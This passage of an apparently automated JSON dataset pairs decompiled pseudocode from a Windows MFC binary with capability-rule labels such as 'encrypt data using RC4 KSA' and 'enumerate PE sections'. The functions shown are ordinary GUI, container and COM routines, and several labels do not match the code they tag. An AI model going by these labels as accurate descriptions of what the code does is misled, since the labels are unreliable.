unaff_EBP + -0x60);\n                            fcn.0042d2f4(uVar2);\n                            fcn.0042d20d(*(unaff_EBP + 0x14));\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x4c), 0, 0, 0x8800c6);\n                            (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                        }\n                        fcn.0042e538();\n                        fcn.0042e538(*(unaff_EBP + -0x4c));\n                        fcn.0042e538(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x20) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 1;\n    fcn.0042e1eb();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042e1eb();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042e1eb();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 2425
    },
    "004408c6": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004408c6(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    if (*(*(param_1 + 100) + -0xc) == 0) {\n        fcn.0040f670(*(param_1 + 0x40));\n    }\n    pcVar2 = _sym.imp.USER32.dll_LoadAcceleratorsA;\n    pcVar1 = _sym.imp.USER32.dll_LoadMenuA;\n    if ((*(param_1 + 0x48) != 0) && (*(param_1 + 0x30) == 0)) {\n        iVar3 = fcn.0043026e();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x48));\n        *(param_1 + 0x30) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x48));\n        *(param_1 + 0x34) = uVar5;\n    }\n    if ((*(param_1 + 0x44) != 0) && (*(param_1 + 0x38) == 0)) {\n        iVar3 = fcn.0043026e();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x44));\n        *(param_1 + 0x38) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x44));\n        *(param_1 + 0x3c) = uVar5;\n    }\n    if ((*(param_1 + 0x4c) != 0) && (*(param_1 + 0x28) == 0)) {\n        iVar3 = fcn.0043026e();\n        uVar5 = *(iVar3 + 0xc);\n        uVar4 = (*pcVar1)(uVar5, *(param_1 + 0x4c));\n        *(param_1 + 0x28) = uVar4;\n        uVar5 = (*pcVar2)(uVar5, *(param_1 + 0x4c));\n        *(param_1 + 0x2c) = uVar5;\n    }\n    return;\n}\n",
        "token_count": 554
    },
    "00440b35": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440b35(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.00440aa2(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "004118a5": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004118a5(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 126
    },
    "004119db": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004119db(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0043026e();\n    *(param_1 + 0x1c) = uVar1;\n    *(param_1 + 4) = 1;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x18) = 0;\n    return param_1;\n}\n",
        "token_count": 149
    },
    "00411de5": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411de5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0xc) = 1;\n    iVar1 = fcn.00423ed7(*(param_1 + 0x94), param_1 + 0x14, 0x80);\n    *(param_1 + 0x10) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0041a1dc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0041a1dc(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00432ead();\n    return param_1;\n}\n",
        "token_count": 145
    },
    "0041fcf0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fcf0(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 4); puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00434e2e();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 145
    },
    "0042167b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042167b(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CList_struct_HWND_____struct_HWND____.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 112
    },
    "0042578c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0042578c(code **param_1)\n\n{\n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.0040f620();\n    fcn.0040f620();\n    fcn.0040f620();\n    fcn.0040f620();\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[1] = 0x1;\n    return param_1;\n}\n",
        "token_count": 119
    },
    "0042e322": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042e322(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x20);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.0042e171(uVar2);\n    if (iVar3 == 0) {\n        fcn.0042d7eb();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 292
    },
    "0043288e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043288e(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != 0) {\n        fcn.004115a4(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.00434e2e();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 123
    },
    "00432a35": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00432a35(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapPtrToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 132
    },
    "0043304b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043304b(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00434e2e();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "00433165": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00433165(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CPtrList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 104
    },
    "004345ff": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004345ff(code **param_1, code *param_2)\n\n{\n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_2 < 1) {\n        param_2 = 0xa;\n    }\n    param_1[1] = NULL;\n    param_1[2] = 0x11;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 131
    },
    "00434687": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00434687(int32_t param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.0043457e(param_2);\n    *param_3 = uVar1;\n    uVar1 = uVar1 % *(param_1 + 8);\n    *param_2 = uVar1;\n    if (*(param_1 + 4) != 0) {\n        for (puVar3 = *(*(param_1 + 4) + uVar1 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n            if ((puVar3[1] == *param_3) && (iVar2 = fcn.004126f7(unaff_retaddr),  iVar2 == 0)) {\n                return puVar3;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 231
    },
    "00434738": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434738(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uStack24;\n    uint uStack20;\n    \n    if (*(param_1 + 4) != 0) {\n        uVar2 = 0;\n        if (*(param_1 + 8) != 0) {\n            do {\n                for (puVar3 = *(*(param_1 + 4) + uVar2 * 4); puVar3 != NULL; puVar3 = *puVar3) {\n                    if (puVar3 == 0xfffffff8) {\n                        uStack20 = 0;\n                        uStack24 = 0x4b62b8;\n                        fcn.0046230a(&stack0xffffffe8, 0x4a76e8);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    uStack24 = 0x434761;\n                    fcn.0041d2c2();\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < *(param_1 + 8));\n        }\n        uStack20 = *(param_1 + 4);\n        uStack24 = 0x434775;\n        fcn.004115a4();\n        *(param_1 + 4) = 0;\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    uStack20 = 0x434787;\n    fcn.00434e2e();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 386
    },
    "00457b2b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457b2b(int32_t param_1)\n\n{\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 4) = 0;\n    fcn.00434e2e();\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 104
    },
    "00457c97": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00457c97(code **param_1, code *param_2)\n\n{\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    *param_1 = vtable.CObList.0;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 105
    },
    "00459815": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00459815(code **param_1, code *param_2, code *param_3, code *param_4, code *param_5)\n\n{\n    fcn.004119db();\n    *param_1 = vtable.CEnumArray.0;\n    param_1[0xe] = vtable.CEnumArray::XEnumVOID.0;\n    param_1[9] = NULL;\n    param_1[0xb] = NULL;\n    param_1[8] = param_2;\n    param_1[0xc] = param_4;\n    param_1[10] = param_3;\n    param_1[0xd] = param_5;\n    return param_1;\n}\n",
        "token_count": 164
    },
    "0040fcb0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040fcb0(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 106
    },
    "00412c60": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412c60(uint param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    int32_t iVar6;\n    uint unaff_retaddr;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetMenuItemCount;\n    (*_sym.imp.USER32.dll_GetMenuItemCount)(param_3);\n    iVar2 = (*pcVar1)(unaff_retaddr);\n    pcVar1 = _sym.imp.USER32.dll_GetSubMenu;\njoined_r0x00412c7d:\n    do {\n        do {\n            iVar2 = iVar2 + -1;\n            if (iVar2 < 0) {\n                return;\n            }\n            iVar3 = (*pcVar1)(param_1, iVar2);\n            iVar6 = 0;\n        } while (iVar3 == 0);\n        if (param_2 != 0) {\n            iVar4 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar3);\n            if (0 < iVar4) {\n                do {\n                    iVar5 = (*pcVar1)(iVar3, iVar6);\n                    if (iVar5 == param_2) {\n                        (*_sym.imp.USER32.dll_RemoveMenu)(iVar3, iVar6, 0x400);\n                        param_2 = 0;\n                        break;\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < iVar4);\n            }\n            goto joined_r0x00412c7d;\n        }\n        if (0 < unaff_ESI) {\n            do {\n                iVar4 = (*pcVar1)(unaff_retaddr, iVar6);\n                if (iVar4 == iVar3) {\n                    (*_sym.imp.USER32.dll_RemoveMenu)(param_1, iVar2, 0x400);\n                    break;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < unaff_ESI);\n        }\n    } while( true );\n}\n",
        "token_count": 460
    },
    "004257cb": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004257cb(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00402740();\n    ppiVar3 = param_1[5] + -0x10;\n    piVar1 = param_1[5] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "00426cfe": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00426cfe(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.0042fcbb();\n        iVar2 = fcn.00426c3f(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 272
    },
    "004300e0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004300e0(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    fcn.0040f620();\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x14] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0x20;\n    extraout_ECX[8] = 0x14;\n    extraout_ECX[6] = NULL;\n    *(extraout_ECX + 5) = uVar1;\n    *(unaff_EBP + -4) = 2;\n    fcn.0040f8a0(0x1000);\n    *(unaff_EBP + -4) = 1;\n    extraout_ECX[0xc] = 0x1;\n    extraout_ECX[0x11] = 0x18;\n    pcVar3 = fcn.00411579(8);\n    extraout_ECX[0x1e] = pcVar3;\n    iVar4 = fcn.0043088b(0x188);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 4;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.0042fdf9();\n    }\n    puVar2 = extraout_ECX[0x1e];\n    *(unaff_EBP + -4) = 1;\n    *puVar2 = uVar5;\n    iVar4 = fcn.0043088b(100);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 5;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.0043003d();\n    }\n    *(extraout_ECX[0x1e] + 4) = uVar5;\n    extraout_ECX[0x1f] = 0x1;\n    extraout_ECX[0x20] = NULL;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 731
    },
    "00432b3c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00432b3c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    fcn.00448e8d(*(pcVar1 + 4), 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.00432a35(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.00432a35(4);\n    iVar2 = 0;\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 0xc) != 0) goto code_r0x00432b91;\n    do {\n        iVar2 = fcn.00411e42();\ncode_r0x00432b91:\n    } while (*(unaff_EBP + 0x10) == iVar2);\n    fcn.00432834(7, iVar2);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    extraout_ECX[0x17] = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 460
    },
    "0044194d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0044194d(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EDI;\n    int32_t unaff_retaddr;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004171e0(0);\n    iVar3 = 0;\n    fcn.004171b0(0, unaff_retaddr, 1);\n    iVar2 = fcn.004171e0(1);\n    fcn.004171b0(1, unaff_EDI, 1);\n    fcn.004172f7(iVar1 - iVar3, iVar2 - unaff_retaddr, 0, 0);\n    return;\n}\n",
        "token_count": 156
    },
    "00451fa4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00451fa4(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        if (*(param_1 + 0x3c) != 0) {\n            uVar1 = fcn.00431b42(0x4a0ff8);\n            (**(**(param_1 + 0x3c) + 0x18))(*(param_1 + 0x3c), uVar1, 0, 0);\n        }\n    }\n    else if (param_2 == 1) {\n        if (*(param_1 + 0x38) != 0) {\n            (**(**(param_1 + 0x38) + 0x1c))(*(param_1 + 0x38));\n        }\n    }\n    else if (param_2 == 2) {\n        if (*(param_1 + 0x38) != 0) {\n            (**(**(param_1 + 0x38) + 0x20))(*(param_1 + 0x38));\n        }\n    }\n    else if ((param_2 == 3) && (*(param_1 + 0x38) != 0)) {\n        (**(**(param_1 + 0x38) + 0x18))(*(param_1 + 0x38), param_3);\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00453f2f": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453f2f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    iVar1 = fcn.00412d0c(arg_10h, arg_8h, &var_14h);\n    *(iVar1 + 0x10) = 1;\n    iVar1 = fcn.00453e7c(iVar1, 1);\n    *(iVar1 + 0x1c) = 0;\n    *(iVar1 + 0x14) = 1;\n    *(iVar1 + 0x18) = arg_ch;\n    return;\n}\n",
        "token_count": 152
    },
    "00453faa": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453faa(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    \n    iVar1 = fcn.00412d0c(arg_ch, arg_8h, &var_14h);\n    *(iVar1 + 0x10) = 5;\n    iVar1 = fcn.00453e7c(iVar1, 1);\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0x1c) = 0;\n    return;\n}\n",
        "token_count": 143
    },
    "00454032": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454032(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_14h;\n    \n    uVar1 = fcn.00412d0c(arg_ch, arg_8h, &var_14h);\n    iVar2 = fcn.00453e7c(uVar1, 2);\n    *(iVar2 + 0x14) = 0;\n    *(iVar2 + 0x18) = 0;\n    *(iVar2 + 0x1c) = 0;\n    return;\n}\n",
        "token_count": 135
    },
    "0045a473": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0045a473(code **param_1, code **param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.COleControlLock.0;\n    param_1[6] = NULL;\n    param_1[1] = *param_2;\n    param_1[2] = param_2[1];\n    param_1[3] = param_2[2];\n    param_1[4] = param_2[3];\n    ppiVar1 = param_1 + 5;\n    *ppiVar1 = NULL;\n    iVar2 = fcn.0042fcbb();\n    if ((*(iVar2 + 0x100) == 0) && (iVar2 = fcn.004592bc(),  iVar2 == 0)) {\n        return param_1;\n    }\n    iVar2 = (*_sym.imp.ole32.dll_CoGetClassObject)(param_2, 3, 0, 0x4a09e8, ppiVar1);\n    if ((-1 < iVar2) && (iVar2 = (**(**ppiVar1 + 0x10))(*ppiVar1, 1),  iVar2 < 0)) {\n        (**(**ppiVar1 + 8))(*ppiVar1);\n        *ppiVar1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 315
    },
    "0045b44b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0045b44b(code **param_1, code *param_2)\n\n{\n    fcn.0043fb1a();\n    param_1[4] = param_2;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    *param_1 = vtable.CMemFile.0;\n    param_1[9] = 0x1;\n    return param_1;\n}\n",
        "token_count": 123
    },
    "0045b719": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b719(int32_t *param_1)\n\n{\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    if ((param_1[8] != 0) && (param_1[9] != 0)) {\n        (**(*param_1 + 0x60))(param_1[8]);\n    }\n    param_1[8] = 0;\n    return;\n}\n",
        "token_count": 125
    },
    "0045b830": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0045b830(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMemFile.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.0045b719();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    fcn.0043fcc0();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 221
    },
    "0045d4f4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
